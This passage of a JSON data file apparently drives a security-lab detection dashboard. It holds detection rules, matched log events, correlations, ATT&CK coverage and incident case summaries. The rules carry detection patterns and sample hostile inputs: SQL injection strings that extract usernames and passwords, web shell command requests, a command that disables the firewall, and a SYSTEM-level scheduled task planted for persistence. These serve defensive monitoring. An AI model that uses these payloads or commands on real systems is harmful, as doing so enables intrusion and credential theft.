   "last": "2026-11-11T11:46:17.000Z",
   "query": "any where url.query like~ (\"*union select*\", \"*' or 1=1*\", \"*sleep(*\", \"*benchmark(*\", \"*information_schema*\")",
   "events": [
    {
     "ts": "2026-11-11T11:46:05.000Z",
     "message": "203.0.113.77 - - \"GET /search?q=1' or 1=1-- HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.8.4#stable (https://sqlmap.org)\"",
     "user": ""
    },
    {
     "ts": "2026-11-11T11:46:08.000Z",
     "message": "203.0.113.77 - - \"GET /product?id=1 union select username,password from users HTTP/1.1\" 200 512 \"-\" \"sqlmap/1.8.4#stable (https://sqlmap.org)\"",
     "user": ""
    },
    {
     "ts": "2026-11-11T11:46:11.000Z",
     "message": "203.0.113.77 - - \"GET /login?user=admin' or 1=1-- HTTP/1.1\" 200 512 \"-\" \"sqlmap/1.8.4#stable (https://sqlmap.org)\"",
     "user": ""
    }
   ]
  },
  {
   "id": null,
   "title": "Scheduled Task Created via Schtasks",
   "level": "medium",
   "tactics": [
    "execution",
    "persistence"
   ],
   "tactic": "execution",
   "techniques": [
    "T1053.005"
   ],
   "host": "WIN10-LAB",
   "count": 1,
   "first": "2026-11-11T11:44:30.000Z",
   "last": "2026-11-11T11:44:30.000Z",
   "query": "any where process.executable.caseless:\"*\\\\schtasks.exe\" and process.command_line:\"*/create*\" and (not user.name:\"*$\")",
   "events": [
    {
     "ts": "2026-11-11T11:44:30.000Z",
     "message": "schtasks.exe /create /tn \"Updater\" /tr \"C:\\Users\\Public\\upd.exe\" /sc onlogon /ru SYSTEM /f",
     "user": "LAB\\admin"
    }
   ]
  },
  {
   "id": null,
   "title": "Web Request to Common Web Shell Parameter",
   "level": "medium",
   "tactics": [
    "execution",
    "persistence"
   ],
   "tactic": "execution",
   "techniques": [
    "T1505.003"
   ],
   "host": "web01",
   "count": 10,
   "first": "2026-11-11T11:46:29.000Z",
   "last": "2026-11-11T11:52:10.000Z",
   "query": "any where (url.query like~ (\"*cmd=*\", \"*exec=*\", \"*shell=*\", \"*command=*\")) and (not (url.path like~ (\"*/health\", \"*/status\")))",
   "events": [
    {
     "ts": "2026-11-11T11:46:29.000Z",
     "message": "203.0.113.77 - - \"GET /run?cmd=id HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
     "user": ""
    },
    {
     "ts": "2026-11-11T11:46:32.000Z",
     "message": "203.0.113.77 - - \"GET /run?exec=whoami HTTP/1.1\" 500 512 \"-\" \"Mozilla/5.0\"",
     "user": ""
    },
    {
     "ts": "2026-11-11T11:50:20.000Z",
     "message": "203.0.113.77 - - \"GET /uploads/shell.php?cmd=id HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36\"",
     "user": ""
    }
   ]
  },
  {
   "id": null,
   "title": "Windows Firewall Disabled",
   "level": "medium",
   "tactics": [
    "defense_evasion"
   ],
   "tactic": "defense_evasion",
   "techniques": [
    "T1562.004"
   ],
   "host": "WIN10-LAB",
   "count": 1,
   "first": "2026-11-11T11:43:20.000Z",
   "last": "2026-11-11T11:43:20.000Z",
   "query": "any where ((process.command_line:\"*advfirewall*\" and process.command_line:\"*set*\") and (process.command_line like~ (\"*off*\", \"*disable*\"))) or (process.command_line:\"*Set-NetFirewallProfile*\" and process.command_line:\"*Enabled*\" and process.command_line:\"*False*\")",
   "events": [
    {
     "ts": "2026-11-11T11:43:20.000Z",
     "message": "netsh advfirewall set allprofiles state off",
     "user": "LAB\\admin"
    }
   ]
  },
  {
   "id": null,
   "title": "Host and Account Discovery Command",
   "level": "low",
   "tactics": [
    "discovery"
   ],
   "tactic": "discovery",
   "techniques": [
    "T1087"
   ],
   "host": "WIN10-LAB",
   "count": 8,
   "first": "2026-11-11T11:33:00.000Z",
   "last": "2026-11-11T11:34:36.000Z",
   "query": "any where process.command_line like~ (\"*whoami*\", \"*net user*\", \"*net group*\", \"*net view*\", \"*nltest*\", \"*systeminfo*\", \"*ipconfig /all*\")",
   "events": [
    {
     "ts": "2026-11-11T11:33:00.000Z",
     "message": "whoami /all",
     "user": "LAB\\analyst"
    },
    {
     "ts": "2026-11-11T11:33:12.000Z",
     "message": "net user",
     "user": "LAB\\analyst"
    },
    {
     "ts": "2026-11-11T11:33:24.000Z",
     "message": "net user administrator /domain",
     "user": "LAB\\analyst"
    }
   ]
  },
  {
   "id": null,
   "title": "SSH Failed Password Authentication",
   "level": "low",
   "tactics": [
    "credential_access"
   ],
   "tactic": "credential_access",
   "techniques": [
    "T1110.001"
   ],
   "host": "linux01",
   "count": 39,
   "first": "2026-11-11T05:00:00.000Z",
   "last": "2026-11-11T11:51:54.000Z",
   "query": "any where message:\"*Failed password*\"",
   "events": [
    {
     "ts": "2026-11-11T05:00:00.000Z",
     "message": "Failed password for deploy from 198.51.100.9 port 44220 ssh2",
     "user": "deploy"
    },
    {
     "ts": "2026-11-11T07:00:00.000Z",
     "message": "Failed password for deploy from 198.51.100.9 port 44221 ssh2",
     "user": "deploy"
    },
    {
     "ts": "2026-11-11T09:00:00.000Z",
     "message": "Failed password for deploy from 198.51.100.9 port 44222 ssh2",
     "user": "deploy"
    }
   ]
  },
  {
   "id": null,
   "title": "Web Scanner User Agent",
   "level": "low",
   "tactics": [
    "reconnaissance"
   ],
   "tactic": "reconnaissance",
   "techniques": [
    "T1595.002"
   ],
   "host": "web01",
   "count": 20,
   "first": "2026-11-11T11:46:00.000Z",
   "last": "2026-11-11T11:47:06.000Z",
   "query": "any where user_agent.original like~ (\"*sqlmap*\", \"*nikto*\", \"*nmap*\", \"*masscan*\", \"*gobuster*\", \"*dirbuster*\")",
   "events": [
    {
     "ts": "2026-11-11T11:46:00.000Z",
     "message": "203.0.113.77 - - \"GET / HTTP/1.1\" 200 512 \"-\" \"sqlmap/1.8.4#stable (https://sqlmap.org)\"",
     "user": ""
    },
    {
     "ts": "2026-11-11T11:46:05.000Z",
     "message": "203.0.113.77 - - \"GET /search?q=1' or 1=1-- HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.8.4#stable (https://sqlmap.org)\"",
     "user": ""
    },
    {
     "ts": "2026-11-11T11:46:08.000Z",
     "message": "203.0.113.77 - - \"GET /product?id=1 union select username,password from users HTTP/1.1\" 200 512 \"-\" \"sqlmap/1.8.4#stable (https://sqlmap.org)\"",
     "user": ""
    }
   ]
  }
 ],
 "correlations": [
  {
   "correlation_id": "corr-discovery-burst",
   "title": "Account and Domain Discovery Burst",
   "level": "medium",
   "technique": "T1087",
   "group_by": "host.name",
   "group_value": "WIN10-LAB",
   "count": 4,
   "threshold": 4,
   "distinct_by": null,
   "distinct_count": 0,
   "distinct_threshold": 0,
   "window_seconds": 300,
   "first_seen": "2026-11-11T11:33:12Z",
   "last_seen": "2026-11-11T11:33:48Z",
   "index": "lab-windows"
  },
  {
   "correlation_id": "corr-dns-tunnel",
   "title": "Sustained DNS Queries to an External Domain",
   "level": "high",
   "technique": "T1071.004",
   "group_by": "host.name",
   "group_value": "WIN10-LAB",
   "count": 12,
   "threshold": 12,
   "distinct_by": null,
   "distinct_count": 0,
   "distinct_threshold": 0,
   "window_seconds": 120,
   "first_seen": "2026-11-11T11:38:00Z",
   "last_seen": "2026-11-11T11:38:44Z",
   "index": "lab-windows"
  },
  {
   "correlation_id": "corr-ransomware-file-burst",
   "title": "High-Volume File Writes Consistent with Encryption",
   "level": "critical",
   "technique": "T1486",
   "group_by": "host.name",
   "group_value": "WIN10-LAB",
   "count": 15,
   "threshold": 15,
   "distinct_by": null,
   "distinct_count": 0,
   "distinct_threshold": 0,
   "window_seconds": 120,
   "first_seen": "2026-11-11T11:24:35Z",
   "last_seen": "2026-11-11T11:26:32Z",
   "index": "lab-windows"
  },
  {
   "correlation_id": "corr-password-spray",
   "title": "Password Spray Across Many Accounts",
   "level": "high",
   "technique": "T1110.003",
   "group_by": "source.ip",
   "group_value": "198.51.100.23",
   "count": 10,
   "threshold": 10,
   "distinct_by": "user.name",
   "distinct_count": 10,
   "distinct_threshold": 8,
   "window_seconds": 600,
   "first_seen": "2026-11-11T11:10:00Z",
   "last_seen": "2026-11-11T11:11:03Z",
   "index": "lab-linux"
  },
  {
   "correlation_id": "corr-ssh-bruteforce",
   "title": "SSH Brute Force Against a Single Host",
   "level": "high",
   "technique": "T1110.001",
   "group_by": "source.ip",
   "group_value": "198.51.100.23",
   "count": 8,
   "threshold": 8,
   "distinct_by": null,
   "distinct_count": 0,
   "distinct_threshold": 0,
   "window_seconds": 300,
   "first_seen": "2026-11-11T11:10:00Z",
   "last_seen": "2026-11-11T11:10:49Z",
   "index": "lab-linux"
  },
  {
   "correlation_id": "corr-ssh-bruteforce",
   "title": "SSH Brute Force Against a Single Host",
   "level": "high",
   "technique": "T1110.001",
   "group_by": "source.ip",
   "group_value": "203.0.113.44",
   "count": 8,
   "threshold": 8,
   "distinct_by": null,
   "distinct_count": 0,
   "distinct_threshold": 0,
   "window_seconds": 300,
   "first_seen": "2026-11-11T11:48:00Z",
   "last_seen": "2026-11-11T11:50:06Z",
   "index": "lab-linux"
  },
  {
   "correlation_id": "corr-port-scan",
   "title": "Horizontal Port Scan from One Source",
   "level": "medium",
   "technique": "T1046",
   "group_by": "source.ip",
   "group_value": "192.0.2.66",
   "count": 20,
   "threshold": 20,
   "distinct_by": null,
   "distinct_count": 0,
   "distinct_threshold": 0,
   "window_seconds": 60,
   "first_seen": "2026-11-11T11:20:00Z",
   "last_seen": "2026-11-11T11:20:38Z",
   "index": "lab-network"
  },
  {
   "correlation_id": "corr-web-scan",
   "title": "Web Enumeration from One Source",
   "level": "low",
   "technique": "T1595.002",
   "group_by": "source.ip",
   "group_value": "203.0.113.77",
   "count": 20,
   "threshold": 20,
   "distinct_by": null,
   "distinct_count": 0,
   "distinct_threshold": 0,
   "window_seconds": 60,
   "first_seen": "2026-11-11T11:46:00Z",
   "last_seen": "2026-11-11T11:46:56Z",
   "index": "lab-web"
  },
  {
   "correlation_id": "corr-web-shell-burst",
   "title": "Repeated Web Shell Command Execution",
   "level": "high",
   "technique": "T1505.003",
   "group_by": "source.ip",
   "group_value": "203.0.113.77",
   "count": 5,
   "threshold": 5,
   "distinct_by": null,
   "distinct_count": 0,
   "distinct_threshold": 0,
   "window_seconds": 120,
   "first_seen": "2026-11-11T11:50:20Z",
   "last_seen": "2026-11-11T11:51:20Z",
   "index": "lab-web"
  }
 ],
 "timeline": [
  {
   "hour": "2026-11-11T03:00:00Z",
   "total": 0,
   "critical": 0,
   "high": 0,
   "medium": 0,
   "low": 0
  },
  {
   "hour": "2026-11-11T04:00:00Z",
   "total": 0,
   "critical": 0,
   "high": 0,
   "medium": 0,
   "low": 0
  },
  {
   "hour": "2026-11-11T05:00:00Z",
   "total": 1,
   "critical": 0,
   "high": 0,
   "medium": 0,
   "low": 1
  },
  {
   "hour": "2026-11-11T06:00:00Z",
   "total": 0,
   "critical": 0,
   "high": 0,
   "medium": 0,
   "low": 0
  },
  {
   "hour": "2026-11-11T07:00:00Z",
   "total": 1,
   "critical": 0,
   "high": 0,
   "medium": 0,
   "low": 1
  },
  {
   "hour": "2026-11-11T08:00:00Z",
   "total": 0,
   "critical": 0,
   "high": 0,
   "medium": 0,
   "low": 0
  },
  {
   "hour": "2026-11-11T09:00:00Z",
   "total": 1,
   "critical": 0,
   "high": 0,
   "medium": 0,
   "low": 1
  },
  {
   "hour": "2026-11-11T10:00:00Z",
   "total": 0,
   "critical": 0,
   "high": 0,
   "medium": 0,
   "low": 0
  },
  {
   "hour": "2026-11-11T11:00:00Z",
   "total": 167,
   "critical": 6,
   "high": 50,
   "medium": 47,
   "low": 64
  },
  {
   "hour": "2026-11-11T12:00:00Z",
   "total": 0,
   "critical": 0,
   "high": 0,
   "medium": 0,
   "low": 0
  },
  {
   "hour": "2026-11-11T13:00:00Z",
   "total": 0,
   "critical": 0,
   "high": 0,
   "medium": 0,
   "low": 0
  }
 ],
 "hosts": [
  {
   "name": "WIN10-LAB",
   "count": 26
  },
  {
   "name": "linux01",
   "count": 8
  },
  {
   "name": "web01",
   "count": 6
  },
  {
   "name": "aws-prod",
   "count": 2
  },
  {
   "name": "DC01",
   "count": 1
  },
  {
   "name": "edge-fw01",
   "count": 1
  }
 ],
 "sources": [
  {
   "name": "windows.sysmon_operational",
   "count": 60
  },
  {
   "name": "system.auth",
   "count": 40
  },
  {
   "name": "nginx.access",
   "count": 39
  },
  {
   "name": "windows.security",
   "count": 13
  },
  {
   "name": "windows.system",
   "count": 6
  },
  {
   "name": "system.syslog",
   "count": 3
  },
  {
   "name": "system.audit",
   "count": 3
  },
  {
   "name": "aws.cloudtrail",
   "count": 2
  },
  {
   "name": "network.flow",
   "count": 2
  },
  {
   "name": "system.cron",
   "count": 1
  },
  {
   "name": "windows.defender",
   "count": 1
  }
 ],
 "coverage": {
  "covered": [
   "T1003.001",
   "T1003.002",
   "T1027",
   "T1041",
   "T1053.003",
   "T1053.005",
   "T1059",
   "T1059.001",
   "T1059.004",
   "T1070.001",
   "T1070.002",
   "T1071.004",
   "T1078.004",
   "T1087",
   "T1098.001",
   "T1098.004",
   "T1105",
   "T1110.001",
   "T1136.001",
   "T1140",
   "T1190",
   "T1218.005",
   "T1218.011",
   "T1486",
   "T1489",
   "T1490",
   "T1505.003",
   "T1543.002",
   "T1543.003",
   "T1546.003",
   "T1547.001",
   "T1548.002",
   "T1548.003",
   "T1558.003",
   "T1560.001",
   "T1562.001",
   "T1562.004",
   "T1566.001",
   "T1569.002",
   "T1595.002"
  ],
  "covered_count": 39,
  "gaps": [
   {
    "technique": "T1059.003",
    "name": "Windows Command Shell"
   },
   {
    "technique": "T1055",
    "name": "Process Injection"
   },
   {
    "technique": "T1078",
    "name": "Valid Accounts"
   },
   {
    "technique": "T1071.001",
    "name": "Web Protocols"
   },
   {
    "technique": "T1021.004",
    "name": "SSH"
   },
   {
    "technique": "T1021.002",
    "name": "SMB/Windows Admin Shares"
   }
  ],
  "cells": [
   {
    "technique": "T1003.001",
    "name": "T1003.001",
    "covered": true
   },
   {
    "technique": "T1003.002",
    "name": "T1003.002",
    "covered": true
   },
   {
    "technique": "T1027",
    "name": "T1027",
    "covered": true
   },
   {
    "technique": "T1041",
    "name": "T1041",
    "covered": true
   },
   {
    "technique": "T1046",
    "name": "T1046",
    "covered": true
   },
   {
    "technique": "T1053.003",
    "name": "T1053.003",
    "covered": true
   },
   {
    "technique": "T1053.005",
    "name": "T1053.005",
    "covered": true
   },
   {
    "technique": "T1059",
    "name": "T1059",
    "covered": true
   },
   {
    "technique": "T1059.001",
    "name": "T1059.001",
    "covered": true
   },
   {
    "technique": "T1059.004",
    "name": "T1059.004",
    "covered": true
   },
   {
    "technique": "T1070.001",
    "name": "T1070.001",
    "covered": true
   },
   {
    "technique": "T1070.002",
    "name": "T1070.002",
    "covered": true
   },
   {
    "technique": "T1071.004",
    "name": "T1071.004",
    "covered": true
   },
   {
    "technique": "T1078.004",
    "name": "T1078.004",
    "covered": true
   },
   {
    "technique": "T1087",
    "name": "T1087",
    "covered": true
   },
   {
    "technique": "T1098.001",
    "name": "T1098.001",
    "covered": true
   },
   {
    "technique": "T1098.004",
    "name": "T1098.004",
    "covered": true
   },
   {
    "technique": "T1105",
    "name": "T1105",
    "covered": true
   },
   {
    "technique": "T1110.001",
    "name": "T1110.001",
    "covered": true
   },
   {
    "technique": "T1110.003",
    "name": "T1110.003",
    "covered": true
   },
   {
    "technique": "T1136.001",
    "name": "T1136.001",
    "covered": true
   },
   {
    "technique": "T1140",
    "name": "T1140",
    "covered": true
   },
   {
    "technique": "T1190",
    "name": "T1190",
    "covered": true
   },
   {
    "technique": "T1218.005",
    "name": "T1218.005",
    "covered": true
   },
   {
    "technique": "T1218.011",
    "name": "T1218.011",
    "covered": true
   },
   {
    "technique": "T1486",
    "name": "T1486",
    "covered": true
   },
   {
    "technique": "T1489",
    "name": "T1489",
    "covered": true
   },
   {
    "technique": "T1490",
    "name": "T1490",
    "covered": true
   },
   {
    "technique": "T1505.003",
    "name": "T1505.003",
    "covered": true
   },
   {
    "technique": "T1543.002",
    "name": "T1543.002",
    "covered": true
   },
   {
    "technique": "T1543.003",
    "name": "T1543.003",
    "covered": true
   },
   {
    "technique": "T1546.003",
    "name": "T1546.003",
    "covered": true
   },
   {
    "technique": "T1547.001",
    "name": "T1547.001",
    "covered": true
   },
   {
    "technique": "T1548.002",
    "name": "T1548.002",
    "covered": true
   },
   {
    "technique": "T1548.003",
    "name": "T1548.003",
    "covered": true
   },
   {
    "technique": "T1558.003",
    "name": "T1558.003",
    "covered": true
   },
   {
    "technique": "T1560.001",
    "name": "T1560.001",
    "covered": true
   },
   {
    "technique": "T1562.001",
    "name": "T1562.001",
    "covered": true
   },
   {
    "technique": "T1562.004",
    "name": "T1562.004",
    "covered": true
   },
   {
    "technique": "T1059.003",
    "name": "Windows Command Shell",
    "covered": false
   },
   {
    "technique": "T1055",
    "name": "Process Injection",
    "covered": false
   },
   {
    "technique": "T1078",
    "name": "Valid Accounts",
    "covered": false
   },
   {
    "technique": "T1071.001",
    "name": "Web Protocols",
    "covered": false
   },
   {
    "technique": "T1021.004",
    "name": "SSH",
    "covered": false
   },
   {
    "technique": "T1021.002",
    "name": "SMB/Windows Admin Shares",
    "covered": false
   }
  ]
 },
 "cases": [
  {
   "id": "DL-2026-001",
   "title": "SSH brute force followed by a successful login",
   "severity": "high",
   "verdict": "True positive",
   "status": "Escalated to IR",
   "opened": "2026-11-11",
   "hosts": [
    "linux01"
   ],
   "techniques": [
    "T1110.001",
    "T1021.004"
   ],
   "detections": [
    "corr-ssh-bruteforce",
    "linux_ssh_failed_password"
   ],
   "summary": "Fourteen failures across six usernames, then a successful login as deploy from the same address 36 seconds later.",
   "path": "cases/case-001-ssh-bruteforce/report.md"
  },
  {
   "id": "DL-2026-002",
   "title": "Macro to credential theft to persistence",
   "severity": "critical",
   "verdict": "True positive",
   "status": "Escalated, host isolation recommended",
   "opened": "2026-11-11",
   "hosts": [
    "WIN10-LAB"
   ],
   "techniques": [
    "T1566.001",
    "T1059.001",
    "T1105",
    "T1003.001",
    "T1543.003"
   ],
   "detections": [
    "win_powershell_encoded_command",
    "win_certutil_download",
    "win_lsass_process_access",
    "win_defender_disabled",
    "win_service_install_susp_path",
    "win_schtasks_create"
   ],
   "summary": "A document spawned hidden PowerShell, downloaded a payload with certutil, dumped LSASS, then installed a service and a scheduled task.",
   "path": "cases/case-002-multi-stage-intrusion/report.md"
  },
  {
   "id": "DL-2026-003",
   "title": "Ransomware pre-encryption sequence on a workstation",
   "severity": "critical",
   "verdict": "True positive",
   "status": "Contained, host rebuilt",
   "opened": "2026-11-11",
   "hosts": [
    "WIN10-LAB"
   ],
   "techniques": [
    "T1490",
    "T1489",
    "T1486"
   ],
   "detections": [
    "win_shadow_copy_deletion",
    "win_bcdedit_recovery_disabled",
    "win_service_stop",
    "win_ransomware_note",
    "corr-ransomware-file-burst"
   ],
   "summary": "Recovery deletion, two service stops, ransom notes, and 24 encrypted files in 46 seconds. Contained before the share was fully encrypted.",
   "path": "cases/case-003-ransomware/report.md"
  }
 ]
};
